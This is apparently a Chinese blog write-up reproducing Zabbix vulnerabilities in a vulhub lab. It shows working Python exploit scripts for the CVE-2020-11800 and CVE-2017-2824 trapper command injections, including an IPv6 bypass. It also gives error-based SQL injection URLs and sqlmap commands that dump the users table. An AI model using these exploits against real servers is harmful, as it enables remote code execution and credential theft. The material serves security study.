---
title: vulhub
date: 2025-08-06 08:43:48
tags: 漏洞
---

# zabbix

## 简介

Zabbix是一种由Alexei Vladishev开发的网络监视和管理系统，采用Server-Client架构，用于监控各种网络服务、服务器和网络设备的状态。它提供了实时监控、报警机制、性能统计和数据可视化等广泛功能。然而，尽管Zabbix具有强大的功能，但在过去曾存在一些安全漏洞。例如，在CVE-2017-2824中，Zabbix的Server端trapper command功能存在一处代码执行漏洞。这个功能允许用户通过Zabbix Server发送命令到Agent端执行。然而，由于修复补丁的缺陷，攻击者可以通过IPv6进行绕过并注入任意命令，导致远程代码执行。

## CVE-2020-11800(Zabbix远程代码执行漏洞)

### 漏洞描述

Zabbix Server的trapper命令处理，存在命令注入漏洞，可导致远程代码执行。

### 漏洞影响

版本：Zabbix 3.0.x~3.0.30

远程代码执行
CVSSv3 Score
9.0 - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H
AC: HIGH 需要服务端配置开启自动注册，或者Zabbix Proxy（会认证主机名）自动发现。

### 漏洞分析

该漏洞原理与CVE-2017-2824相同，参考
https://talosintelligence.com/reports/TALOS-2017-0325
active checks是自动注册的命令字，自动注册的本意是agent可主动将主机注册给server进行监控，在2.2.18版本中可以在IP中注入（参见上文的版本分析处，2.2.19版本才增加了ip校验）shell命令。CVE-2017-2824提到的漏洞在discovery data命令字即自动发现功能中，由于没有校验IP，导致可在IP中写入shell命令，进而在执行script cmd时达到命令注入。
比如在IP中写入内容

```
;touch /tmp/zabbix_pwned
```

那么执行ping命令时就变为

```bash
/bin/ping -c 3 ;touch /tmp/zabbix_pwned 2>&1
```

CVE-2017-2824在3.0.x的修复方式是对IP进行校验
![img](https://xzfile.aliyuncs.com/media/upload/picture/20210106093015-ba412714-4fbe-1.png)
![img](https://xzfile.aliyuncs.com/media/upload/picture/20210106093112-dca2e11c-4fbe-1.png)
但是校验IP的方法可以被绕过，Ipv4校验没问题，ipv6校验可绕过:
![img](https://xzfile.aliyuncs.com/media/upload/picture/20210106093148-f1b59720-4fbe-1.png)
输入为ffff:::;touch /tmp/1234pwn即可绕过，进而实现命令注入。

### 漏洞复现

本漏洞利用需要开启自动注册功能，所以我们使用默认账号/密码(admin/zabbix)去登录zabbix进行配置

登录进去长这样

![image-20250806090834339](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060908462.png)

我们前往Configuration->Actions后，选择Auto registration，点击Create action

![image-20250806091920564](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060919614.png)

我们随便输入一个名字

![image-20250806091939146](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060919191.png)

然后再创建一个Operations，type选择Add host

![image-20250806092041698](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060920728.png)

点击add添加，再点击add进行保存，这样我们就配置好了

![image-20250806092125109](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508060921151.png)



在下载的vulhub中漏洞目录有漏洞利用脚本，查看poc，我们可以看到执行的是写入文件的操作，我们利用python3执行poc，进入docker中查看写入成功

```py
import sys
import socket
import json
import sys


def send(ip, data):
    conn = socket.create_connection((ip, 10051), 10)
    conn.send(json.dumps(data).encode())
    data = conn.recv(2048)
    conn.close()
    return data


target = sys.argv[1]
print(send(target, {"request":"active checks","host":"vulhub","ip":"ffff:::;touch /tmp/success2"}))
for i in range(10000, 10500):
    data = send(target, {"request":"command","scriptid":1,"hostid":str(i)})
    if data and b'failed' not in data:
        print('hostid: %d' % i)
        print(data)
```

1. 导入模块：代码开始时导入了sys、socket和json模块，这些模块用于处理命令行参数、进行网络通信和处理JSON数据。
2. send函数：这个函数用于向Zabbix Server发送数据的封装。它使用socket.create_connection建立到目标IP地址和端口10051的连接，然后发送一个JSON格式的数据，并等待响应。最后，它关闭连接并返回响应数据。
3. 获取目标IP：通过命令行参数获取目标IP地址，这意味着该脚本用于特定的Zabbix Server目标。
4. 发送数据给Zabbix Server：使用send函数向目标Zabbix Server发送一个JSON请求。这个请求是"active checks"类型的，其中包括主机名和IP地址等参数。这是测试Zabbix系统的活动检查功能。
5. 循环：在一个hostid范围内，从10000到10500，循环尝试向目标Zabbix Server发送命令请求。这个请求包含了脚本ID和主机ID等参数。
6. 检查响应数据：如果响应数据不包含"failed"字样，那么打印出hostid和响应数据。这是用于确认命令是否成功执行的部分。

然后我们执行命令

```
python3 exploit.py 120.46.179.184
```

我们就能在/tmp/下看见一个新创的文件夹



### 修复建议

检验IP



## CVE-2017-2824

### 漏洞原理

zabbix 调用script脚本时，没有对IP地址过滤，导致在注册host的数据包中的ip地址后面可以跟分号+命令的方式执行命令。

### 影响范围

zabbix 2.4.x

zabbix 3.0.x < 3.0.4

### 漏洞复现

我们依旧使用账号密码admin/zabbix登录后台，然后根据CVE-2020-11800的操作开启自动注册功能

然后打脚本

```py
import sys
import socket
import json
import sys


def send(ip, data):
    conn = socket.create_connection((ip, 10051), 10)
    conn.send(json.dumps(data).encode())
    data = conn.recv(2048)
    conn.close()
    return data


target = sys.argv[1]
print(send(target, {"request":"active checks","host":"vulhub","ip":";touch /tmp/cve-2017-2824"}))
for i in range(10000, 10500):
    data = send(target, {"request":"command","scriptid":1,"hostid":str(i)})
    if data and b'failed' not in data:
        print('hostid: %d' % i)
        print(data)
```

然后我们执行命令

```
python3 exploit.py 120.46.179.184
```

我们就能在/tmp/下看见一个新创的文件夹

（不知道为啥失败率都挺高的）



## CVE-2016-101342(sql注入漏洞复现)

### 漏洞描述

Zabbix 的latest.php中的toggle idsI或jsrpc.php种的profieldx2参数存在sql注入，通过sql注入获取管理员账户密码，进入后台，进行getshel操作。

影响版本

```
zabbix 2.0.x| 2.2.x| 2.4.x| 3.0.0-3.0.3
```



### 漏洞复现

**方法一：存在guest空密码账号，无需登录可爆出漏洞：**

访问页面，无需登录，使用注入语句

```
http://x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)
```

通过报错注入得到用户信息和ip信息

![image-20250807090812457](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508070908584.png)



**方法二：用sqlmap**

```bash
查所有库:python3 sqlmap.py -u "http://x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=*" --dbs查zabbix

表:python3 sqlmap.py -u "http://x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=*" -D zabbix --tables

查users列:python3 sqlmap.py -u "http://x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=*" -D zabbix -T users --columns

查userid,name,passwd数据:python3 sqlmap.py -u "http://x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=*" -D zabbix -T users -C userid,name,passwd --dump
```

得到管理员账户和密码

![image-20250807095335846](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508070953890.png)



**方法三：不同的注入页面，使用不同的注入语句**

```
latest.php?output=ajax&sid=3f108ab358161a3b&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
```

（1）使用（**guest/空**）登录后，获取下图**zbx_sessionid**的**16**位值：

![image-20250807101237715](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508071012835.png)

（2）使用下面的语句进行注入查询

```
latest.php?output=ajax&sid=6f8835e35db2f421&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
```

![image-20250807101515664](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202508071015747.png)
